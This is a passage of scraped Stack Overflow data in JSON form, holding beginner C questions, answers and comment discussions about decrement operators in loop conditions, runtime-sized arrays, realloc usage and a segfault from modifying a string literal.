"https://stackoverflow.com/questions/33655155/what-is-the-difference-between-whilen-and-whilen-n-1/33655320#33655320", "title": "what is the difference between while(n--) and while(n=n-1)?", "body": "<p>The value of <code>n--</code> is the previous value of <code>n</code></p>\n\n<pre><code>int n = 10;\n// value of (n--) is 10\n// you can assign that value to another variable and print it\nint k = (n--);                     // extra parenthesis for clarity\nprintf(\"value of n-- is %d\\n\", k);\n</code></pre>\n\n<p>The value of <code>n = n - 1</code> is 1 less than the previous value of <code>n</code></p>\n\n<pre><code>int n = 10;\n// value of (n = n - 1) is 9\n// you can assign that value to another variable and print it\nint k = (n = n - 1);                     // extra parenthesis for clarity\nprintf(\"value of n = n - 1 is %d\\n\", k);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 0, "creation_date": 1447261201, "post_id": 33655352, "comment_id": 55084765, "body": "The value of <code>n</code> changes while evaluating the condition in the <code>while</code> condition. The value seen by the while condition is the value before any change. Immediately after the condition is tested (at the next sequence point) the valued stored in <code>n</code> has been changed. I mean: your first paragraph is still wrong."}, {"owner": {"reputation": 43, "user_id": 5206448, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KfpDG.jpg?s=128&g=1", "display_name": "Md Tawfique Hossain", "link": "https://stackoverflow.com/users/5206448/md-tawfique-hossain"}, "edited": false, "score": 1, "creation_date": 1503234087, "post_id": 33655352, "comment_id": 78522152, "body": "Thanks all . its worked .. hahaha...forgot to replied ."}], "tags": [], "owner": {"reputation": 6380, "user_id": 3071284, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/c2667be070f278228bba19c6a6e734df?s=128&d=identicon&r=PG&f=1", "display_name": "user3071284", "link": "https://stackoverflow.com/users/3071284/user3071284"}, "is_accepted": false, "score": 1, "last_activity_date": 1447260940, "last_edit_date": 1447260940, "creation_date": 1447259956, "answer_id": 33655352, "question_id": 33655155, "link": "https://stackoverflow.com/questions/33655155/what-is-the-difference-between-whilen-and-whilen-n-1/33655352#33655352", "title": "what is the difference between while(n--) and while(n=n-1)?", "body": "<p><code>while(n--)</code> uses <code>n</code> in its body, and the decremented value is used for the next iteration.</p>\n\n<p><code>while(n=n-1)</code> is the same as <code>while(--n)</code>, which decrements and uses this new value of <code>n</code> in its body.</p>\n"}], "owner": {"reputation": 43, "user_id": 5206448, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KfpDG.jpg?s=128&g=1", "display_name": "Md Tawfique Hossain", "link": "https://stackoverflow.com/users/5206448/md-tawfique-hossain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 6966, "favorite_count": 0, "accepted_answer_id": 33655320, "answer_count": 2, "score": 4, "last_activity_date": 1447260940, "creation_date": 1447259366, "last_edit_date": 1447259686, "question_id": 33655155, "link": "https://stackoverflow.com/questions/33655155/what-is-the-difference-between-whilen-and-whilen-n-1", "title": "what is the difference between while(n--) and while(n=n-1)?", "body": "<p>What is the difference between <code>while(n--)</code> and <code>while(n=n-1)</code>? When I use <code>while(n=n-1)</code> in my code, I can input less than 1 number.</p>\n\n<p>Example: First input 3 than input 3 times a single number (but not happening this in <code>while(n=n-1)</code>).\nBut when I use <code>while(n--)</code>, it's normal. </p>\n\n<p>My code is : </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main()\n{\n    int n;\n    long long inum;\n    scanf(\"%d\", &amp;n);\n    while(n--)\n    {\n        scanf(\"%lld\", &amp;inum);\n        if(inum == 0 || inum % 2 == 0)\n        {\n            printf(\"even\\n\");\n        }\n\n        else\n        {\n            printf(\"odd\\n\");\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "arrays"], "comments": [{"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 0, "creation_date": 1447259390, "post_id": 33655093, "comment_id": 55083596, "body": "There are no such things. Length of arrays are static, once allocated cannot be change. For a feature like that, you have to use dynamic memory allocation"}, {"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "reply_to_user": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 2, "creation_date": 1447259441, "post_id": 33655093, "comment_id": 55083641, "body": "@Haris Of course there are: variable length arrays."}, {"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "reply_to_user": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 0, "creation_date": 1447259619, "post_id": 33655093, "comment_id": 55083747, "body": "@this, he is speaking about <i>undefined length array!</i>"}, {"owner": {"reputation": 3134, "user_id": 5475209, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/QRBxV.jpg?s=128&g=1", "display_name": "terence hill", "link": "https://stackoverflow.com/users/5475209/terence-hill"}, "edited": false, "score": 0, "creation_date": 1447259690, "post_id": 33655093, "comment_id": 55083789, "body": "your exercise say that you have to create an array with N elements which is not undefined: first ask to input the length and then read one by one the values from stdin. Anyway I think that the exercise mean an array of generic length."}, {"owner": {"reputation": 35, "user_id": 4618277, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/1514360458784574/picture?type=large", "display_name": "Michelangelo Poli", "link": "https://stackoverflow.com/users/4618277/michelangelo-poli"}, "edited": false, "score": 0, "creation_date": 1447259921, "post_id": 33655093, "comment_id": 55083961, "body": "Type a program in C that take from the keyboard an array with length &quot;N&quot; and calculate the inferior number, the major number, and the arithmetic average of the array.   How would you solve it? (Sorry I&#39;m trying to translate from italian to english)."}, {"owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "edited": false, "score": 0, "creation_date": 1447260390, "post_id": 33655093, "comment_id": 55084242, "body": "there are in fact two perspectives of this question. 1st) the program  have to fill from the input an array that has N elements (N as a const) and do the operations ... . 2nd) the program has to create a dynamic array (VLA) and fill it from the input, then do the operations... , in my opinion it is about the first one, sins the subject is how to do calculations on it."}], "answers": [{"comments": [{"owner": {"reputation": 35, "user_id": 4618277, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/1514360458784574/picture?type=large", "display_name": "Michelangelo Poli", "link": "https://stackoverflow.com/users/4618277/michelangelo-poli"}, "edited": false, "score": 0, "creation_date": 1447259644, "post_id": 33655165, "comment_id": 55083760, "body": "When i set <code>int A[N];</code> i receive an error: Use of undeclared identifier &#39;N&#39;."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 35, "user_id": 4618277, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/1514360458784574/picture?type=large", "display_name": "Michelangelo Poli", "link": "https://stackoverflow.com/users/4618277/michelangelo-poli"}, "edited": false, "score": 0, "creation_date": 1447259744, "post_id": 33655165, "comment_id": 55083835, "body": "@Michelangelo Poli Either your compiler is not C99 compliant or your have not declared <code>N</code>.  Suggest 2nd method.  If that fails, post your code."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 35, "user_id": 4618277, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/1514360458784574/picture?type=large", "display_name": "Michelangelo Poli", "link": "https://stackoverflow.com/users/4618277/michelangelo-poli"}, "edited": false, "score": 0, "creation_date": 1447261473, "post_id": 33655165, "comment_id": 55084908, "body": "@Michelangelo Poli If there are code limitations, best to initially post them in the question than later on add them to the answers."}, {"owner": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1451255231, "post_id": 33655165, "comment_id": 56712937, "body": "I am 100% with you regarding the check for <code>N &lt; 0</code>, but I disagree about the checks for <code>N == 0</code> and <code>N &gt;= Some_Sane_Upper_Limit_Like_1000</code>. I&#39;ve seen such limits transform into really nasty bugs when the limit, which seemed to be insanely large to the programmer who wrote it, was surpassed by a valid use case. Now, whether you need to check for <code>N == 0</code> is entirely up to the requirements of the subsequent processing (it may be sensible, or it may be just another unrequired limitation of usecases), but I regard any arbitrary upper limits as bugs waiting to strike."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1451255794, "post_id": 33655165, "comment_id": 56713100, "body": "@cmaster The &quot;validation on <code>N</code>&quot; is primarily for the VLA and is an example meant to be tailored for the use case.  I also regard <i>arbitrary</i> upper limits as bugs.  Any limit needs relevancy to the task at hand.   I also regard lack of limits as hacker attacks waiting to strike."}, {"owner": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1451257081, "post_id": 33655165, "comment_id": 56713449, "body": "Good point about the hacker attacks, and about the VLA part. Those are reasons why I generally prefer heap allocations over stack VLA&#39;s. Still, if you want to sanity check against those, it suffices to use limits derived from the size of the available address space. A limit like 1000 is never appropriate in my eyes, not even for a stack VLA: We generally have at least a few MiB of available stack space these days. And 1000 is definitely a limit that may easily be exceeded by unforseen usecases."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "reply_to_user": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1451260380, "post_id": 33655165, "comment_id": 56714219, "body": "@cmaster <code>N == 0</code> must be tested because attempting to form a zero-sized VLA causes undefined behaviour."}, {"owner": {"reputation": 129565, "user_id": 1505939, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/131c67ef492a8d8352c6cf642a52e20f?s=128&d=identicon&r=PG", "display_name": "M.M", "link": "https://stackoverflow.com/users/1505939/m-m"}, "edited": false, "score": 2, "creation_date": 1451260434, "post_id": 33655165, "comment_id": 56714230, "body": "I&#39;d regard a stack overflow as bug waiting to strike too, so an upper limit is a good idea.  Of course the code should be written so that if the input exceeds the upper limit then the program handles this situation correctly."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 33597, "user_id": 2445184, "user_type": "registered", "accept_rate": 91, "profile_image": "https://www.gravatar.com/avatar/0b51ece74c2314ba345a862c4b00d804?s=128&d=identicon&r=PG", "display_name": "cmaster - reinstate monica", "link": "https://stackoverflow.com/users/2445184/cmaster-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1451268191, "post_id": 33655165, "comment_id": 56715662, "body": "@cmaster  C is very popular in embedded processors which are made in the 100s of millions to billions/per year in 2015.  Many have nowhere near &quot;few MiB&quot; of space, let alone stack space.  Thus the value to limit is highly dependent on the task and resources at hand.  The key is how to control <code>N</code> and handle excessive array sizes."}], "tags": [], "owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "is_accepted": true, "score": 3, "last_activity_date": 1447267107, "last_edit_date": 1447267107, "creation_date": 1447259387, "answer_id": 33655165, "question_id": 33655093, "link": "https://stackoverflow.com/questions/33655093/array-with-undefined-length-in-c/33655165#33655165", "title": "Array with undefined length in C", "body": "<p>Do not create an array of undefined length.  </p>\n\n<p><em>After</em> getting the needed length <code>N</code>, if C99 use a VLA (Variable Length Array)</p>\n\n<pre><code>int A[N];\n</code></pre>\n\n<p>... or allocate memory</p>\n\n<pre><code>int *A = malloc(sizeof *A * N);\n...\n// use A\n...\nfree(A);\n</code></pre>\n\n<hr>\n\n<p>[Edit]</p>\n\n<p>Good to add validation on <code>N</code> before proceeding.  Example:</p>\n\n<pre><code>if (N &lt;= 0 || N &gt;= Some_Sane_Upper_Limit_Like_1000) return;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2000, "user_id": 4487286, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/YHZoO.jpg?s=128&g=1", "display_name": "milevyo", "link": "https://stackoverflow.com/users/4487286/milevyo"}, "is_accepted": false, "score": 2, "last_activity_date": 1447261740, "last_edit_date": 1447261740, "creation_date": 1447261248, "answer_id": 33655755, "question_id": 33655093, "link": "https://stackoverflow.com/questions/33655093/array-with-undefined-length-in-c/33655755#33655755", "title": "Array with undefined length in C", "body": "<p>for more information about VLA in c99 <a href=\"http://www.drdobbs.com/the-new-cwhy-variable-length-arrays/184401444\" rel=\"nofollow\">The New C:Why Variable Length Arrays?</a></p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n\n\nint main(){\n    int n;\n\n\n    printf(\"size of array: \");\n    scanf(\"%d\",&amp;n);\n    // limit, and erro verification omited\n    int f[n],i;\n\n    printf(\"\\nREADING INPUT\\n\");    \n    for(i=0;i&lt;n;i++){\n        printf(\"\\tValue of f[%d]: \", i);\n        scanf(\"%d\",f+i);\n    }\n\n    /*\n    calc_max(f,n);\n    calc_min(f,n);\n    calc_avg(f,n);\n    */\n    printf(\"\\n\\nPRINTING VALUES:\\n\");\n    for(i=0;i&lt;n;i++){\n        printf(\"\\tValue of f[%d]= %d \\n\", i,f[i]);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 374, "user_id": 5279817, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a6cf64c2a63ef57fe05252a7a36154c?s=128&d=identicon&r=PG&f=1", "display_name": "stek29", "link": "https://stackoverflow.com/users/5279817/stek29"}, "edited": false, "score": 0, "creation_date": 1451251688, "post_id": 33656480, "comment_id": 56711877, "body": "Shouldn&#39;t <code>}else if (i &lt; sizeof(char) * 15){</code> be <code>}else if(i &lt; maxLength){</code> ?"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "reply_to_user": {"reputation": 374, "user_id": 5279817, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a6cf64c2a63ef57fe05252a7a36154c?s=128&d=identicon&r=PG&f=1", "display_name": "stek29", "link": "https://stackoverflow.com/users/5279817/stek29"}, "edited": false, "score": 0, "creation_date": 1451251917, "post_id": 33656480, "comment_id": 56711941, "body": "@stek29 you are a funny guy :)) Why should be <code>else if(i &lt; maxLength)</code>? Both are OK. <code>(i &lt; sizeof(char) * 15)</code> is the same as <code>(i &lt; maxLength)</code> in my Example. I had my reasons why I used <code>(i &lt; sizeof(char) * 15)</code>"}, {"owner": {"reputation": 374, "user_id": 5279817, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5a6cf64c2a63ef57fe05252a7a36154c?s=128&d=identicon&r=PG&f=1", "display_name": "stek29", "link": "https://stackoverflow.com/users/5279817/stek29"}, "edited": false, "score": 0, "creation_date": 1451252145, "post_id": 33656480, "comment_id": 56712026, "body": "could you please explain me why you used it? I&#39;m just trying to learn)"}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 1, "creation_date": 1451252382, "post_id": 33656480, "comment_id": 56712097, "body": "Note: sizeof(char) is by definition 1, so using it is generally redundant."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1451252741, "post_id": 33656480, "comment_id": 56712202, "body": "Also, this code seems to make no sense... Why realloic on every iteration of input loop, ans why to 30nwhen max length seems to be 15?"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "reply_to_user": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1451253347, "post_id": 33656480, "comment_id": 56712370, "body": "@hyde It was just to make the OP to understand how works. If you ask why I used <code>30</code> instead of <code>15</code>, well i think because I used maxlength=30 at that time, then edited. I don&#39;t remember any more."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "reply_to_user": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1451253395, "post_id": 33656480, "comment_id": 56712387, "body": "@hyde Just because this code doesn&#39;t make sense for your, doesn&#39;t make it wrong. Did you down voted me ?"}, {"owner": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1451253876, "post_id": 33656480, "comment_id": 56712528, "body": "How is this program related to the question?"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "reply_to_user": {"reputation": 9301, "user_id": 4944425, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/05592a58619d128e2eee1c3c17801e76?s=128&d=identicon&r=PG&f=1", "display_name": "Bob__", "link": "https://stackoverflow.com/users/4944425/bob"}, "edited": false, "score": 0, "creation_date": 1451254022, "post_id": 33656480, "comment_id": 56712578, "body": "@Bob__ The Question was =&gt;  <code>The question is: In C language, how can i create an undefined length array</code>"}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1451254246, "post_id": 33656480, "comment_id": 56712653, "body": "@Michi that valgrind output looks like classic off-by-one buffer overrun... If maxlength 15 means 15 printable characters, array size needs to be 16 to have room for NUL char."}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1451255440, "post_id": 33656480, "comment_id": 56712992, "body": "For a reasonable (disclaimer: I did not actually run it) realloc exexample, here&#39;s one: <a href=\"http://stackoverflow.com/a/9982882/1717300\">stackoverflow.com/a/9982882/1717300</a>"}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "reply_to_user": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1451255701, "post_id": 33656480, "comment_id": 56713076, "body": "@hyde I do understand that. Me, I was just gave him an Example. What i don&#39;t understand is: what&#39;s wrong with my code? :D"}, {"owner": {"reputation": 50126, "user_id": 1717300, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/81b91f602ce8acea8cbeb29f62725627?s=128&d=identicon&r=PG", "display_name": "hyde", "link": "https://stackoverflow.com/users/1717300/hyde"}, "edited": false, "score": 0, "creation_date": 1451279146, "post_id": 33656480, "comment_id": 56717810, "body": "As it is now, it still seems to call realloc on every iteration (when i = 0...14). It works, because realloc with no size change just doesn&#39;t do anything, but callimg funtions for no reason isn&#39;t very good. It should call realloc only when it actually needs to change the size of allocated memory block."}], "tags": [], "owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "is_accepted": false, "score": 0, "last_activity_date": 1451257166, "last_edit_date": 1451257166, "creation_date": 1447263479, "answer_id": 33656480, "question_id": 33655093, "link": "https://stackoverflow.com/questions/33655093/array-with-undefined-length-in-c/33656480#33656480", "title": "Array with undefined length in C", "body": "<p>It is not easy to satisfy 100% your needs, but you can give it a try:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\nchar *addMe(void);\n\nint main(void){\n    char *test = addMe();\n    free(test);\n    return 0;\n}\n\nchar *addMe(void){\n    unsigned int maxLength = 15;\n    unsigned int i =0;\n\n    char *name;\n    int c;\n\n    name = malloc(1);\n    if(name == NULL){\n        exit(1);\n    }\n\n    printf(\"Enter your name:&gt;  \");\n\n    while ((c = getchar()) != '\\n' &amp;&amp; c != EOF) {\n        name[i++] = (char) c;\n\n        if (i &gt; maxLength) {\n            printf(\"Names longer than %d not allowed!\\n\",maxLength);\n            name[maxLength] = '\\0';\n            break;\n        }else if (i &lt; maxLength){\n            name = realloc(name, maxLength + 2);\n        }\n    }\n\n    name[i] = '\\0';\n    printf(\"Your name is:&gt;  %s\\nThe length is:&gt;  %zu\\n\",name ,strlen(name));\n\n    return name;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<blockquote>\n<pre><code>Enter your name:&gt;  l\nYour name is:&gt;  l\nThe length is:&gt;  1\n</code></pre>\n</blockquote>\n\n<p>As you probably noticed I allocated memory only for one letter, and if you need more it will be allocated to satisfy your needs. You can also with this approach to have control of a maximum size:</p>\n\n<blockquote>\n<pre><code>Enter your name:&gt;  Michael jacksonnnnnnnnnnnnnnnnnnnnnnnnnnnnnnnn\nNames longer than 15 not allowed!\nYour name is:&gt;  Michael jackson\nThe length is:&gt;  15\n</code></pre>\n</blockquote>\n\n<p>Like I said, give it a try.</p>\n"}], "owner": {"reputation": 35, "user_id": 4618277, "user_type": "registered", "accept_rate": 80, "profile_image": "https://graph.facebook.com/1514360458784574/picture?type=large", "display_name": "Michelangelo Poli", "link": "https://stackoverflow.com/users/4618277/michelangelo-poli"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2551, "favorite_count": 0, "accepted_answer_id": 33655165, "answer_count": 3, "score": 3, "last_activity_date": 1451257166, "creation_date": 1447259215, "question_id": 33655093, "link": "https://stackoverflow.com/questions/33655093/array-with-undefined-length-in-c", "title": "Array with undefined length in C", "body": "<p>i was watching an exercise in my textbook that says: Create a C program that take from the keyboard an array with length \"N\".</p>\n\n<p>The question is: In C language, how can i create an undefined length array? </p>\n\n<p>Thank you all.</p>\n"}, {"tags": ["c", "gcc", "segmentation-fault"], "comments": [{"owner": {"reputation": 5077, "user_id": 2327831, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/acb1ec5c15fa33042fa79847c55da18d?s=128&d=identicon&r=PG", "display_name": "this", "link": "https://stackoverflow.com/users/2327831/this"}, "edited": false, "score": 7, "creation_date": 1447259201, "post_id": 33655082, "comment_id": 55083460, "body": "Possible duplicate of <a href=\"http://stackoverflow.com/questions/164194/why-do-i-get-a-segmentation-fault-when-writing-to-a-string-initialized-with-cha\">Why do I get a segmentation fault when writing to a string initialized with &quot;char *s&quot; but not &quot;char s&#91;&#93;&quot;?</a>"}, {"owner": {"reputation": 11494, "user_id": 1795279, "user_type": "registered", "accept_rate": 61, "profile_image": "https://i.stack.imgur.com/4TEag.jpg?s=128&g=1", "display_name": "Haris", "link": "https://stackoverflow.com/users/1795279/haris"}, "edited": false, "score": 3, "creation_date": 1447259278, "post_id": 33655082, "comment_id": 55083516, "body": "<code>char *folderPositionString = &quot;folders-&quot;;</code> is a string literal kept in <b>read only memory.</b> You are trying to change data in a <b>read only memory</b>, So are getting <code>seg fault</code>."}], "answers": [{"comments": [{"owner": {"reputation": 919, "user_id": 5513684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/961769367178033/picture?type=large", "display_name": "Steven Carlson", "link": "https://stackoverflow.com/users/5513684/steven-carlson"}, "edited": false, "score": 1, "creation_date": 1447259807, "post_id": 33655116, "comment_id": 55083884, "body": "Eugene - On the second part, so I guess I am not taking the &#39;value&#39; or account_id, rather I am pointing to its actual memory location?  I&#39;m guessing I should revisit that code because that might have unintended consequences in that code as well."}, {"owner": {"reputation": 919, "user_id": 5513684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/961769367178033/picture?type=large", "display_name": "Steven Carlson", "link": "https://stackoverflow.com/users/5513684/steven-carlson"}, "edited": false, "score": 1, "creation_date": 1447259842, "post_id": 33655116, "comment_id": 55083903, "body": "For the 1st part - would it be better to set folderPositionString using [] or do I need to alloc memory differently?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 919, "user_id": 5513684, "user_type": "registered", "accept_rate": 92, "profile_image": "https://graph.facebook.com/961769367178033/picture?type=large", "display_name": "Steven Carlson", "link": 